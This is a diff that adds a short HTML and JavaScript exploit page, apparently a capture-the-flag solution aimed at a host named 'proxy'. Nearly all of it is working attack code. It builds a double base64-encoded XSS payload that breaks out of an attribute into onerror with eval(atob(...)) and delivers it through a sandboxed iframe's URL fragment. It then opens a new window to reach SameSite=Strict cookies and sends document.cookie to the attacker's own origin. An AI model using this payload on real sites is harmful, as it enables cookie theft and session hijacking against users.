@@ -1,0 +1,34 @@
+<body></body>
+<script>
+    const TARGET = "http://proxy"
+    const i1 = document.createElement('iframe')
+    function waifuDomainScript() {
+        /**
+            I use window.open to open a new window, this will make the browser create new window context that
+            have cookies with SameSite=Strict.
+        */
+        const w = window.open("/")
+        w.onload = () => {
+            window.location = webhook + "?" + w.document.cookie
+        }
+    }
+
+    let payload = btoa(`webhook='${location.origin}';(${waifuDomainScript})()`)
+    payload = btoa(`" onerror="eval(atob('${payload}'))" x="`)
+    i1.src = TARGET + '#' + payload
+    /**
+        Create a sandboxed iframe to prevent alert from being triggered.
+
+        We only need to allow scripts, same origin, and popups, you can check the doc here:
+        https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox
+
+        Because the iframe have recursion prevention system that stated here:
+        https://www.w3.org/TR/WD-frames-970331#Infinite%20Recursion
+        the frame will eventually stop the recursion redirect through the document.referrer and execute our payload.
+
+        There is other way to bypass this, but this is the shortest way to do it.
+        As example you can use csp to prevent the frame from redirecting to document.referrer.
+    */
+    i1.sandbox = 'allow-scripts allow-same-origin allow-popups'
+    document.body.appendChild(i1)
+</script>
